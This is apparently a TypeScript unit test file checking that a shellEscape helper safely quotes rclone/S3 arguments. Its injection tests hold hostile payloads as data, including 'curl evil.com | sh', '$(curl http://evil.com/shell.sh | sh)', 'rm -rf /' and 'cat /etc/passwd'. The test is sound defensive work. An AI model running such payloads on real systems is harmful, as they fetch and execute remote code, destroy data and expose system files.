import { describe, expect, test } from "vitest";

// Shell escape function to safely escape arguments for shell execution
// This is the same function used in destination.ts
function shellEscape(arg: string): string {
	// Replace single quotes with '\'' and wrap in single quotes
	return `'${arg.replace(/'/g, "'\\''")}'`;
}

describe("shellEscape function tests", () => {
	test("should escape simple strings without special characters", () => {
		expect(shellEscape("simple")).toBe("'simple'");
		expect(shellEscape("hello")).toBe("'hello'");
		expect(shellEscape("test123")).toBe("'test123'");
	});

	test("should escape strings with single quotes", () => {
		expect(shellEscape("it's")).toBe("'it'\\''s'");
		expect(shellEscape("can't")).toBe("'can'\\''t'");
		expect(shellEscape("'quoted'")).toBe("''\\''quoted'\\'''");
	});

	test("should escape command injection attempts", () => {
		// Test command substitution attempts
		expect(shellEscape("$(whoami)")).toBe("'$(whoami)'");
		expect(shellEscape("`whoami`")).toBe("'`whoami`'");
		expect(shellEscape("${USER}")).toBe("'${USER}'");

		// Test pipe attempts
		expect(shellEscape("test|ls")).toBe("'test|ls'");

		// Test semicolon command chaining
		expect(shellEscape("test; rm -rf /")).toBe("'test; rm -rf /'");

		// Test ampersand background execution
		expect(shellEscape("test&whoami")).toBe("'test&whoami'");

		// Test logical operators
		expect(shellEscape("test&&whoami")).toBe("'test&&whoami'");
		expect(shellEscape("test||whoami")).toBe("'test||whoami'");

		// Test redirection
		expect(shellEscape("test>file")).toBe("'test>file'");
		expect(shellEscape("test<file")).toBe("'test<file'");

		// Test newline injection
		expect(shellEscape("test\nwhoami")).toBe("'test\nwhoami'");
	});

	test("should handle empty string", () => {
		expect(shellEscape("")).toBe("''");
	});

	test("should handle strings with spaces", () => {
		expect(shellEscape("hello world")).toBe("'hello world'");
		expect(shellEscape("  spaces  ")).toBe("'  spaces  '");
	});

	test("should handle strings with double quotes", () => {
		expect(shellEscape('"quoted"')).toBe('\'\"quoted\"\'');
		expect(shellEscape('say "hello"')).toBe('\'say \"hello\"\'');
	});

	test("should handle strings with backslashes", () => {
		expect(shellEscape("path\\to\\file")).toBe("'path\\to\\file'");
		expect(shellEscape("test\\ntest")).toBe("'test\\ntest'");
	});

	test("should handle complex malicious payloads", () => {
		const malicious = [
			"'; rm -rf / #",
			'"; curl evil.com | sh #',
			"$(curl http://evil.com/shell.sh | sh)",
			"`cat /etc/passwd`",
			"test' && echo 'pwned",
			"a'$IFS'b",
		];

		for (const payload of malicious) {
			const escaped = shellEscape(payload);
			// Verify it's wrapped in single quotes
			expect(escaped.startsWith("'")).toBe(true);
			expect(escaped.endsWith("'")).toBe(true);
			// Verify single quotes are properly escaped
			if (payload.includes("'")) {
				expect(escaped).toContain("'\\''");
			}
		}
	});

	test("should handle S3 credential-like strings", () => {
		// Test realistic S3 credentials
		expect(shellEscape("AKIAIOSFODNN7EXAMPLE")).toBe(
			"'AKIAIOSFODNN7EXAMPLE'",
		);
		expect(shellEscape("wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY")).toBe(
			"'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'",
		);

		// Test with special characters in keys
		expect(shellEscape("key+with/special=chars")).toBe(
			"'key+with/special=chars'",
		);
	});

	test("should handle bucket names", () => {
		expect(shellEscape("my-bucket")).toBe("'my-bucket'");
		expect(shellEscape("my.bucket.name")).toBe("'my.bucket.name'");
		expect(shellEscape("bucket_123")).toBe("'bucket_123'");
	});

	test("should handle regions", () => {
		expect(shellEscape("us-east-1")).toBe("'us-east-1'");
		expect(shellEscape("eu-west-2")).toBe("'eu-west-2'");
		expect(shellEscape("ap-south-1")).toBe("'ap-south-1'");
	});

	test("should handle endpoints", () => {
		expect(shellEscape("https://s3.amazonaws.com")).toBe(
			"'https://s3.amazonaws.com'",
		);
		expect(shellEscape("http://localhost:9000")).toBe(
			"'http://localhost:9000'",
		);
	});

	test("should properly escape for use in rclone commands", () => {
		// Test a complete rclone argument set
		const args = [
			"--s3-access-key-id=AKIAIOSFODNN7EXAMPLE",
			"--s3-secret-access-key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
			"--s3-region=us-east-1",
			"--s3-endpoint=https://s3.amazonaws.com",
			":s3:my-bucket",
		];

		const escaped = args.map((arg) => shellEscape(arg));

		for (const esc of escaped) {
			expect(esc.startsWith("'")).toBe(true);
			expect(esc.endsWith("'")).toBe(true);
		}
	});

	describe("Security verification - escaped strings should not execute", () => {
		test("command substitution should be neutralized", () => {
			const dangerous = "$(whoami)";
			const escaped = shellEscape(dangerous);
			// The escaped version should contain the literal characters
			// and not allow command execution
			expect(escaped).toBe("'$(whoami)'");
			// When used in a command, this will be treated as a literal string
			// not as a command substitution
		});

		test("backtick command substitution should be neutralized", () => {
			const dangerous = "`whoami`";
			const escaped = shellEscape(dangerous);
			expect(escaped).toBe("'`whoami`'");
		});

		test("variable expansion should be neutralized", () => {
			const dangerous = "$HOME";
			const escaped = shellEscape(dangerous);
			expect(escaped).toBe("'$HOME'");
		});
	});
});
